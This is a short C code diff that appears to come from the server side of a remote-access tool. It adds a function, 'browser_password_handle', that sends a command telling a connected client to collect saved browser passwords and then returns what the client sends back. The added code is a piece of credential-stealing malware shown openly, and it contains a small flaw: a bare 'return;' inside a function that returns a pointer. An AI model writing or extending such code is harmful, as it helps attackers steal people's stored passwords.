@@ -185,3 +185,12 @@ void upload_file_to_client(sock_t client_fd, char* remote_path, char* local_path
         printf("[ERR] Client reported failure while uploading.\n");
     }
 }
+
+char* browser_password_handle(sock_t client_fd) {
+    // This one doesnt require payload from server
+    int dummy = 0;
+    if (safe_send(client_fd, &dummy, BROWSER_PASS_CMD, sizeof(int), 0) <= 0) return;
+
+    char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
+    return res;
+}
